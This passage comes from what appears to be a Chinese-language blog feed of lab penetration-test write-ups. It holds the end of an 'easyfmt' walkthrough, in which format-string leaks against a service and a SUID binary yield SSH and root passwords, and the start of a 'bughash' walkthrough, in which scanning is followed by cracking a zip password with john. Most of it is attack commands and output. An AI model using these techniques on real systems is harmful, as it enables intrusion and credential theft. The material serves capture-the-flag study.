AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

‰∏¢‰∫Ü‰∫øÁÇπAËøáÂéªÔºåÂõûÊòæÊ≤°‰ª∑ÂÄºÔºå**Ê†àÊ∫¢Âá∫**ÊöÇÊó∂Êó†Êûú

ÁÑ∂ÂêéÂ∞±ËØï‰∫Ü‰∏Ä‰∏ã**Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤**

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nc 192.168.205.139 1337
welcome:Where is my password?
root:Well,it's in the stack,just find it.
%p.%p.%p.%p.%p.%p
0x1afc2a1.(nil).0x1afc2b2.0x7ffd9c94ced0.0x7ff5d0eb2be0.0x70252e70252e7025

```

ÊâæÂà∞‰∫ÜÔºåÊãøËÑöÊú¨ÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ for i in $(seq 1 40); do echo -n '$i\n'
pa=$(python3 -c 'print('.'.join(['%p'] * $i))')
echo '$pa' | nc -w 1 192.168.205.139 1337 | tail -n 1
done
1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22
0xf472a1.(nil).(nil).0x7ffd4ea8b960.0x7f08e27a0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f08e25f5d7a.0x7ffd4ea8bab8.0x14ea8bc89.
23
0x21f62a1.(nil).(nil).0x7fff4c072100.0x7f0958737be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f095858cd7a.0x7fff4c072258.0x14c072429.
24
0x135f2a1.(nil).(nil).0x7ffce42da9e0.0x7f908d69abe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f908d4efd7a.0x7ffce42dab38.0x1e42dad09.
25
0x1b9f2a1.(nil).(nil).0x7ffdc9ef61f0.0x7f8a23246be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8a2309bd7a.0x7ffdc9ef6348.0x1c9ef6519.
26
0x10472a1.(nil).(nil).0x7fff6159ddc0.0x7f4e89dc1be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f4e89c16d7a.0x7fff6159df18.0x16159e0e9.
27
0x1de52a1.(nil).(nil).0x7fff75c854d0.0x7ff45c50bbe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff45c360d7a.0x7fff75c85628.0x175c857f9.
28
0xbe52a1.(nil).(nil).0x7ffe4fd2f9b0.0x7f5fc99e8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5fc983dd7a.0x7ffe4fd2fb08.0x14fd2fcd9.
29
0x1b822a1.(nil).(nil).0x7fffc7c06ac0.0x7f3e6f018be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f3e6ee6dd7a.0x7fffc7c06c18.0x1c7c06de9.
30
0x176f2a1.(nil).(nil).0x7ffd196b6bd0.0x7f79cf143be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f79cef98d7a.0x7ffd196b6d28.0x1196b6ef9.
31
0x1b242a1.(nil).(nil).0x7ffe081aeea0.0x7f978cae5be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f978c93ad7a.0x7ffe081aeff8.0x1081af1c9.
32
0x1f1c2a1.(nil).(nil).0x7ffe621be420.0x7f9d098d9be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f9d0972ed7a.0x7ffe621be578.0x1621be749.
33
0x191c2a1.(nil).(nil).0x7ffc5b7e0190.0x7f5c090fabe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5c08f4fd7a.0x7ffc5b7e02e8.0x15b7e04b9.
34
0x1e482a1.(nil).(nil).0x7ffd2f19fc30.0x7ff602059be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff601eaed7a.0x7ffd2f19fd88.0x12f19ff59.
35
0x19452a1.(nil).(nil).0x7ffd038568d0.0x7f2a117a8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f2a115fdd7a.0x7ffd03856a28.0x103856bf9.
36
0xd592a1.(nil).(nil).0x7ffde1f69190.0x7f8e3bbc2be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8e3ba17d7a.0x7ffde1f692e8.0x1e1f694b9.
37
0x126a2a1.(nil).(nil).0x7ffe821c3800.0x7f492e554be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f492e3a9d7a.0x7ffe821c3958.0x1821c3b29.
38
0x9dc2a1.(nil).(nil).0x7ffd0117d1e0.0x7fb8ec1b4be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fb8ec009d7a.0x7ffd0117d338.0x10117d509.
39
0x10c22a1.(nil).(nil).0x7ffdd856fdc0.0x7fd5d4155be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fd5d3faad7a.0x7ffdd856ff18.0x1d85700e9.
40
0x8e82a1.(nil).(nil).0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f34bfaf5d7a.0x7ffd3af090b8.0x13af09289.

```

Èöè‰æøÊãø‰∏ÄË°åÂ§ÑÁêÜ‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo '0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f' | sed 's/0x//g; s/\./\n/g'|while read line; do echo '$line' | xxd -r -p 2&gt;/dev/null |rev 2&gt;/dev/null;done
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.welcome:Y0u_c4nt_f1nd_m3                                                                                     
```

welcome:Y0u_c4nt_f1nd_m3

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ssh welcome@192.168.205.139
The authenticity of host '192.168.205.139 (192.168.205.139)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (6 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.139' (ED25519) to the list of known hosts.
welcome@192.168.205.139's password: 
Linux easyfmt 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 18 09:56:53 2025 from 192.168.43.21
welcome@easyfmt:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

Êâæ

```
welcome@easyfmt:~$ ls -al
total 44
drwx------ 3 welcome welcome 4096 Jun 17 10:53 .
drwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..
lrwxrwxrwx 1 root    root       9 Jun 15 08:24 .bash_history -&gt; /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
drwxr-xr-x 4 welcome welcome 4096 Jun 17 00:58 .cache
-rw------- 1 root    root       2 Jun 15 08:59 .gdb_history
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 welcome welcome  682 Jun 17 07:39 server.c
-rw-r--r-- 1 root    root      44 Jun 17 10:40 user.txt
-rw------- 1 welcome welcome 8187 Jun 17 10:53 .viminfo
welcome@easyfmt:~$ cat user.txt 
flag{user-a0f6b8f4de02df56f52e55bcdded458c}
welcome@easyfmt:~$ sudo -l
sudo: unable to resolve host easyfmt: Name or service not known
[sudo] password for welcome: 
Sorry, user welcome may not run sudo on easyfmt.
welcome@easyfmt:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/opt/vuln
welcome@easyfmt:~$ cd /opt/
welcome@easyfmt:/opt$ ls -al
total 52
drwxr-xr-x  3 root    root     4096 Jun 18 09:51 .
drwxr-xr-x 18 root    root     4096 Mar 18 20:37 ..
drwxr-xr-x  6 root    root     4096 Dec 31  1969 pwndbg
-rwxr-xr-x  1 welcome welcome 16696 Jun 17 07:39 server
-rwsr-xr-x  1 root    root    17104 Jun 18 09:51 vuln
welcome@easyfmt:/opt$ strings vuln 
/lib64/ld-linux-x86-64.so.2
mgUa
setuid
exit
perror
puts
stdin
printf
fgets
read
malloc
open
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
/root/pass.txt
open
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
vuln.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
printf@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@GLIBC_2.2.5
__bss_start
main
setgid@GLIBC_2.2.5
open@GLIBC_2.2.5
perror@GLIBC_2.2.5
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

ÊãâËøáÊù•Ôºå‰∏¢Âéªida

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
char s[68]; // [rsp+10h] [rbp-50h] BYREF
int fd; // [rsp+54h] [rbp-Ch]
void *buf; // [rsp+58h] [rbp-8h]
setuid(0);
setgid(0);
buf = malloc(0x18uLL);
fd = open('/root/pass.txt', 0);
if ( fd &lt; 0 )
{
perror('open');
exit(1);
}
puts('welcome:I have found mine.Then,where is your password?');
puts('root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.');
puts('welcome:Hahahaha,let's try:');
read(fd, buf, 0x18uLL);
fgets(s, 6, stdin);
printf(s);
return 0;
}
```

‰ªñÁõ¥Êé•ÊääËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤sÂΩì‰ΩúprintfÁöÑÂèÇÊï∞‰∫Ü

ÊâÄ‰ª•ÁªßÁª≠

```
welcome@easyfmt:/opt$ for i in $(seq 1 20);do
&gt; p='/opt/vuln'
&gt; pa='%$i\$s'
&gt; echo ''$pa''
&gt; echo '$pa' | $p
&gt; done
'%1$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%2$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)
'%3$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:

'%4$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
%4$s

'%5$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
ÔøΩf!ÔøΩ[U
'%6$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
,ÔøΩ^@ÔøΩ
'%7$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%8$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%9$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%10$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
'%11$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
HÔøΩÔøΩH9ÔøΩuÔøΩHÔøΩ[]A\A]A^A_ÔøΩ'%12$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)'%13$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)'%14$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
AWLÔøΩ=?+'%15$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
1ÔøΩIÔøΩÔøΩ^HÔøΩÔøΩHÔøΩÔøΩÔøΩPTLÔøΩ
'%16$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%17$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Y0u_4r3_S0_Gr34t!
'%18$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
AWLÔøΩ=?+'%19$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
ÔøΩÔøΩÔøΩy'%20$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
```

Y0u_4r3_S0_Gr34t!

```
welcome@easyfmt:/opt$ su -
Password: 
root@easyfmt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@easyfmt:~# cat /root/root.txt 
flag{root-8a6fbe864f3154b901643b4943980d5e}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_easyfmt.html</guid><pubDate>Fri, 27 Jun 2025 09:29:32 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_bughash</title><link>https://7r1UMPHK.github.io/post/nei-bu-_bughash.html</link><description>ÂÜçÊé•ÂÜçÂéâÔºÅ

![image-20250608114424427](https://7r1umphk.github.io/image/20250608114424653.webp)

ÁúãÈù∂Êú∫ip

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.131 08:00:27:1f:68:e6       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.180 seconds (117.43 hosts/sec). 4 responded
                                                          
```

Êé¢ÊµãÊúçÂä°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p22,8080 -sC -sV 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 23:44 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00079s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_zip2john 2026bak.zip &gt; ziphash
MAC Address: 08:00:27:1F:68:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
                                                                                 
```

ÁúãÂà∞8080Êúâ‰∏™2026bak.zipÊñá‰ª∂ÔºåÊãâ‰∏ãÊù•

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ wget http://192.168.205.131:8080/2026bak.zip
--2025-06-07 23:46:14--  http://192.168.205.131:8080/2026bak.zip
Connecting to 192.168.205.131:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 676250 (660K) [application/zip]
Saving to: ‚Äò2026bak.zip‚Äô

2026bak.zip                                  100%[=============================================================================================&gt;] 660.40K  --.-KB/s    in 0.03s   

2025-06-07 23:46:14 (24.1 MB/s) - ‚Äò2026bak.zip‚Äô saved [676250/676250]

                            
```

Â∞ùËØïÊâìÂºÄ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ 7z x 2026bak.zip                      

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 676250 bytes (661 KiB)

Extracting archive: 2026bak.zip
--
Path = 2026bak.zip
Type = zip
Physical Size = 676250

    
Enter password (will not be echoed):
```

Ë¶ÅÂØÜÁ†ÅÔºåjohnÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ zip2john 2026bak.zip &gt; hash
ver 2.0 2026bak.zip/2026bak/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/app.js PKZIP Encr: TS_chk, cmplen=550, decmplen=1189, crc=398AEF6F ts=58E6 cs=58e6 type=8
ver 2.0 2026bak.zip/2026bak/package.json PKZIP Encr: TS_chk, cmplen=188, decmplen=269, crc=B3FD1F4B ts=51B7 cs=51b7 type=8
ver 2.0 2026bak.zip/2026bak/pnpm-lock.yaml PKZIP Encr: TS_chk, cmplen=6576, decmplen=16896, crc=8A30424C ts=95C7 cs=95c7 type=8
ver 2.0 2026bak.zip/2026bak/public/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/css/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/css/all.min.css PKZIP Encr: TS_chk, cmplen=22371, decmplen=102025, crc=3F9C99C5 ts=908D cs=908d type=8
ver 2.0 2026bak.zip/2026bak/public/index.html PKZIP Encr: TS_chk, cmplen=2337, decmplen=8708, crc=BA472F2A ts=6A60 cs=6a60 type=8
ver 2.0 2026bak.zip/2026bak/public/js/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/js/index.js PKZIP Encr: TS_chk, cmplen=2140, decmplen=7773, crc=51B509C2 ts=50FC cs=50fc type=8
ver 2.0 2026bak.zip/2026bak/public/js/md5.min.js PKZIP Encr: TS_chk, cmplen=1587, decmplen=3770, crc=ABC5E899 ts=A254 cs=a254 type=8
ver 2.0 2026bak.zip/2026bak/public/js/seedrandom.min.js PKZIP Encr: TS_chk, cmplen=924, decmplen=1631, crc=A32D162A ts=9BE5 cs=9be5 type=8
ver 2.0 2026bak.zip/2026bak/public/robots.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=122, crc=707883A9 ts=4D0C cs=4d0c type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.ttf PKZIP Encr: TS_chk, cmplen=122902, decmplen=210792, crc=B603F717 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.woff2 PKZIP Encr: TS_chk, cmplen=118720, decmplen=118680, crc=E0935466 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.ttf PKZIP Encr: TS_chk, cmplen=26762, decmplen=68064, crc=8BAA11E2 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.woff2 PKZIP Encr: TS_chk, cmplen=25494, decmplen=25472, crc=D76269F6 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.ttf PKZIP Encr: TS_chk, cmplen=173643, decmplen=426112, crc=43F15403 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.woff2 PKZIP Encr: TS_chk, cmplen=158282, decmplen=158220, crc=2F37E44A ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.ttf PKZIP Encr: TS_chk, cmplen=5048, decmplen=10836, crc=56DA8271 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.woff2 PKZIP Encr: TS_chk, cmplen=4813, decmplen=4796, crc=D4BF5069 ts=2BFC cs=2bfc type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ john --show hash                                     
2026bak.zip:123456789::2026bak.zip:2026bak/public/robots.txt, 2026bak/package.json, 2026bak/app.js, 2026bak/public/js/seedrandom.min.js, 2026bak/public/js/md5.min.js, 2026bak/public/js/index.js, 2026bak/public/index.html, 2026bak/public/webfonts/fa-v4compatibility.woff2:2026bak.zip

1 password hash cracked, 0 left
               
```

123456789ÁöÑÂØÜÁ†ÅÔºåËß£Âéã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ 7z x 2026bak.zip -p123456789          

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 676250 bytes (661 KiB)

Extracting archive: 2026bak.zip
--
Path = 2026bak.zip
Type = zip
Physical Size = 676250

    
Would you like to replace the existing file:
  Path:     ./2026bak/app.js
  Size:     0 bytes
  Modified: 2025-06-05 23:07:10
with the file from archive:
  Path:     2026bak/app.js
  Size:     1189 bytes (2 KiB)
  Modified: 2025-06-05 23:07:10
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

Everything is Ok       

Folders: 5
Files: 17
Size:       1165355
Compressed: 676250
                                           
```

ÁúãÁúãÁõÆÂΩïÁªìÊûÑ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cd 2026bak                   
                
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/2026bak]
‚îî‚îÄ$ tree .    
.
‚îú‚îÄ‚îÄ app.js
